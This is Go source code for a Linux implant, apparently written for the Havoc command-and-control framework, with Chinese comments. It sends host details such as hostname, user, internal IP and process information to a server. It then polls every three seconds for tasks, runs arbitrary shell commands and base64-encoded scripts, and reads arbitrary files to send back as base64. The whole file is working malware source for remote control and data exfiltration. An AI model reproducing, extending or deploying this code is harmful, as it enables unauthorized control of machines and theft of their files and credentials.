package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	AGENT_BUFFER_SIZE     = 1024
	AGENT_EXECUTE_TIMEOUT = 10
	AGENT_REGISTER        = "register"
	AGENT_GET_TASK        = "get_task"
	AGENT_POST_TASK       = "post_task"
	AGENT_SEND_BASE64     = "base64"
	AGENT_DOWNLOADFILE    = "download_file"
	AGENT_SLEEP_SECOND    = 3
	COMMAND_CAT_FILE      = 0x156
	COMMAND_SHELL         = 0x152
	COMMAND_SHELL_SCRIPT  = 0x151
	COMMAND_DOWNLOAD      = 0x153
)

type Agent interface {
	NewAgent() Agent
	GetRandomString(length int) string
	GetHostname() string
	GetCurrentUsername() string
	GetLocalIP() string
	GetCurrentFilePath() string
	GetPid() string
	GetPPid() string
	GetOSArch() string
	GetProcessName() string
	GetOSVersion() string
	ExecuteCommand(command string) string
	ExecuteScript(shell string, command string, timeout time.Duration) string
	CatFile(path string) string
	ReadFile(path string) []byte
	Register() bool
	GetTask() []byte
	PostTask(taskPackage TaskPackage) []byte
	DispatcherTask()
}

type LinuxAgent struct {
	// 在此添加结构体需要的其他字段
	AgentID         string
	SleepSecond     int
	CommandsChannel chan []byte
	TaskDataChannel chan TaskPackage
	StopChannel     chan bool
}

func (agent *LinuxAgent) NewAgent() Agent {
	return &LinuxAgent{
		AgentID:         agent.GetRandomString(4),
		SleepSecond:     AGENT_SLEEP_SECOND,
		CommandsChannel: make(chan []byte),
		TaskDataChannel: make(chan TaskPackage),
		StopChannel:     make(chan bool),
	}
}

func (agent *LinuxAgent) GetTask() []byte {
	TaskData := TaskPackage{}
	TaskData.Task = AGENT_GET_TASK
	PackageBuffer := NewPackage(&TaskData, agent.AgentID)
	response, err := PostWithHeaders(PackageBuffer)
	if err != nil {
		log.Println("HTTP POST error: ", err)
		return []byte{}
	}
	return response
}

func (agent *LinuxAgent) PostTask(taskPackage TaskPackage) []byte {
	PackageBuffer := NewPackage(&taskPackage, agent.AgentID)
	response, err := PostWithHeaders(PackageBuffer)
	if err != nil {
		log.Println("HTTP POST error: ", err)
		return []byte{}
	}
	return response
}

func (agent *LinuxAgent) GetRandomString(length int) string {
	// 实现 GetRandomString 方法的逻辑
	rand.Seed(time.Now().UnixNano())
	letters := "abcdefghijklmnopqrstuvwxyz"
	result := make([]byte, length)
	for i := 0; i < length; i++ {
		result[i] = letters[rand.Intn(len(letters))]
	}
	return string(result)
}

func (agent *LinuxAgent) GetHostname() string {
	// 实现 GetHostname 方法的逻辑
	hostname, err := os.Hostname()
	if err != nil {
		log.Println(err)
		return ""
	}
	return hostname

}

func (agent *LinuxAgent) GetCurrentUsername() string {
	// 实现 GetCurrentUsername 方法的逻辑
	currentUser, err := user.Current()
	if err != nil {
		log.Println(err)
		return ""
	}
	return currentUser.Username
}

func (agent *LinuxAgent) GetLocalIP() string {
	// 实现 GetLocalIP 方法的逻辑
	// 获取所有网络接口
	interfaces, err := net.Interfaces()
	if err != nil {
		log.Println(err)
		return ""
	}

	// 遍历网络接口，找到非回环地址的IPv4或IPv6地址
	for _, iface := range interfaces {
		// 排除回环地址和无效地址
		if iface.Flags&net.FlagLoopback == 0 && iface.Flags&net.FlagUp != 0 {
			addrs, err := iface.Addrs()
			if err != nil {
				return ""
			}
			for _, addr := range addrs {
				ipNet, ok := addr.(*net.IPNet)
				if ok && !ipNet.IP.IsLoopback() {
					// 排除IPv6链接本地地址
					if ipNet.IP.To4() != nil {
						return ipNet.IP.String()
					}
				}
			}
		}
	}
	return ""
}

func (agent *LinuxAgent) GetCurrentFilePath() string {
	// 实现 GetCurrentFilePath 方法的逻辑
	// 获取可执行文件的路径
	exePath, err := os.Executable()
	if err != nil {
		log.Println(err)
		return ""
	}

	// 获取可执行文件所在的目录路径
	filePath := filepath.Dir(exePath)
	return filePath
}

func (agent *LinuxAgent) GetPid() string {
	// 实现 GetPid 方法的逻辑
	return strconv.Itoa(os.Getpid())
}

func (agent *LinuxAgent) GetPPid() string {
	// 实现 GetPPid 方法的逻辑
	return strconv.Itoa(os.Getppid())
}

func (agent *LinuxAgent) GetOSArch() string {
	// 实现 GetOSArch 方法的逻辑
	return runtime.GOARCH
}

func (agent *LinuxAgent) GetProcessName() string {
	// 实现 GetProcessName 方法的逻辑
	executablePath, err := os.Executable()
	if err != nil {
		log.Println(err)
		return ""
	}
	processName := filepath.Base(executablePath)
	return processName
}

func (agent *LinuxAgent) GetOSVersion() string {
	version := "10.0.19045.3448"
	// 实现 GetOSVersion 方法的逻辑
	// https://github.com/HavocFramework/Havoc/blob/3bf236c417b3963034ae3722f41bf521f14a3476/teamserver/pkg/agent/agent.go#L288C58-L288C58
	if runtime.GOOS == "windows" {
		// 执行 cmd.exe /c ver 命令获取 Windows 版本信息
		cmd := exec.Command("cmd.exe", "/c", "ver")
		output, err := cmd.CombinedOutput()
		if err != nil {
			return version
		}
		// 使用正则表达式匹配版本号
		r, err := regexp.Compile(`\s+(\d+\.\d+\.\d+\.\d+)`)
		if err != nil {
			return version
		}

		// 在命令输出中搜索匹配的子串
		matches := r.FindStringSubmatch(string(output))
		if matches == nil {
			return version
		}
		// 获取版本号
		version = matches[1]
	} else {
		version = runtime.GOOS
	}
	return version
}

func (agent *LinuxAgent) Register() bool {
	TaskData := TaskPackage{}
	registerData := Package{}
	log.Println("AgentID :", agent.AgentID)
	// 默认情况下 3s
	registerData.RegisterData.AgentID = agent.AgentID
	registerData.RegisterData.Hostname = agent.GetHostname()
	registerData.RegisterData.Username = agent.GetCurrentUsername()
	registerData.RegisterData.InternalIP = agent.GetLocalIP()
	registerData.RegisterData.ProcessPath = agent.GetCurrentFilePath()
	registerData.RegisterData.ProcessID = agent.GetPid()
	registerData.RegisterData.ProcessParentID = agent.GetPPid()
	registerData.RegisterData.ProcessArch = agent.GetOSArch()
	registerData.RegisterData.ProcessElevated = 0
	registerData.RegisterData.OSBuild = "NOT IMPLEMENTED YET"
	registerData.RegisterData.Sleep = uint32(AGENT_SLEEP_SECOND)
	registerData.RegisterData.ProcessName = agent.GetProcessName()
	registerData.RegisterData.OSVersion = agent.GetOSVersion()
	log.Println(registerData.RegisterData.OSVersion)
	TaskData.Task = AGENT_REGISTER
	marshal, err := json.Marshal(registerData.RegisterData)
	if err != nil {
		log.Fatal(err)
	}
	TaskData.Data = string(marshal)
	PackageBuffer := NewPackage(&TaskData, agent.AgentID)
	response, err := PostWithHeaders(PackageBuffer)
	if err != nil {
		log.Println("HTTP POST error:", err)
		return false
	}
	log.Println("Register :", string(response))
	return true
}

func (agent *LinuxAgent) DispatcherTask() {
	var wg sync.WaitGroup
	// 一直获取任务信息
	go func() {
		for {
			commands := agent.GetTask()
			agent.CommandsChannel <- commands
			time.Sleep(time.Duration(agent.SleepSecond) * time.Second)
		}
	}()

	go func() {
		taskData := TaskPackage{}
		for {
			commands := <-agent.CommandsChannel
			log.Println("Get Task...", commands)
			if len(commands) < 8 {
				continue
			}
			action := int(binary.LittleEndian.Uint32(commands[0:4]))
			switch action {
			case COMMAND_CAT_FILE:
				file := string(commands[8:])
				file = strings.Trim(file, "\x00")
				file = strings.Trim(file, " ")
				log.Println("Cat File....", file)
				taskData.Task = AGENT_SEND_BASE64
				taskData.Data = agent.CatFile(file)
				break
			case COMMAND_SHELL:
				command := string(commands[8:])
				log.Println(command, len(command))
				taskData.Task = AGENT_POST_TASK
				taskData.Data = agent.ExecuteCommand(command)
				break
			case COMMAND_SHELL_SCRIPT:
				shellNameSize := int(binary.LittleEndian.Uint32(commands[8:12]))
				shellName := strings.Trim(string(commands[12:12+shellNameSize]), "\x00")
				shellScript := strings.Trim(string(commands[12+shellNameSize+8:]), "\x00")
				log.Println("shellScriptSize", shellName, shellScript)
				taskData.Task = AGENT_POST_TASK
				taskData.Data = agent.ExecuteScript(shellName, string(Base64Decode(shellScript)), time.Duration(AGENT_EXECUTE_TIMEOUT)*time.Second)
				break
			case COMMAND_DOWNLOAD:
				file := string(commands[8:])
				file = strings.Trim(file, "\x00")
				file = strings.Trim(file, " ")
				log.Println("Download File....", file)
				content := agent.CatFile(file)
				taskData.Task = AGENT_DOWNLOADFILE
				taskData.Data = content
				taskData.External = file
			}
			// 将任务结果数据发送回去
			agent.TaskDataChannel <- taskData
		}
	}()

	go func() {
		for {
			taskData := <-agent.TaskDataChannel
			agent.PostTask(taskData)
		}
	}()

	log.Println("Wait....")
	<-agent.StopChannel
	wg.Wait()
}

func (agent *LinuxAgent) ExecuteCommand(command string) string {
	var cmd *exec.Cmd
	command = strings.Trim(command, "\x00")
	commands := strings.Split(command, " ")
	commands = RemoveEmptyStrings(commands)
	if len(commands) > 1 {
		cmd = exec.Command(commands[0], commands[1:]...)
	} else {
		cmd = exec.Command(commands[0])
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(err)
		return err.Error()
	}
	return string(output)
}

func (agent *LinuxAgent) ExecuteScript(shell string, command string, timeout time.Duration) string {
	var cmd *exec.Cmd

	cmd = exec.Command(shell, "-")

	// 获取标准输入（stdin）管道
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err.Error()
	}

	// 获取标准输出（stdout）管道
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err.Error()
	}

	// 启动进程
	err = cmd.Start()
	if err != nil {
		return err.Error()
	}

	// 创建一个用于读取标准输出的读取器
	reader := bufio.NewReader(stdout)

	// 创建一个上下文，并设置超时时间
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	// 创建一个缓冲区，用于保存命令输出结果
	var outputBuf bytes.Buffer

	// 用于发送命令到标准输入的 goroutine
	go func() {
		// 将命令字符串按行拆分，并逐行发送到标准输入
		scanner := bufio.NewScanner(strings.NewReader(command))
		for scanner.Scan() {
			command := scanner.Text()
			// 发送命令到标准输入
			_, err := fmt.Fprintln(stdin, command+"\n")
			if err != nil {
				log.Println(err)
			}
		}
		// 关闭标准输入管道，表示输入结束
		stdin.Close()
	}()

	// 用于读取命令输出结果并保存到缓冲区的 goroutine
	go func() {
		// 读取命令输出结果并保存到缓冲区
		for {
			select {
			case <-ctx.Done():
				return
			default:
				line, err := reader.ReadString('\n')
				if err != nil && err != io.EOF {
					return
				}

				outputBuf.WriteString(line)

				if err == io.EOF {
					return
				}
			}
		}
	}()

	// 等待进程退出
	err = cmd.Wait()
	if err != nil {
		return err.Error()
	}
	// 将缓冲区的内容转换为字符串
	output := outputBuf.String()
	return output
}

func (agent *LinuxAgent) CatFile(path string) string {
	return Base64Encode(agent.ReadFile(path))
}

func (agent *LinuxAgent) ReadFile(path string) []byte {
	content, err := ioutil.ReadFile(path)
	if err != nil {
		return []byte(err.Error())
	}
	return content
}
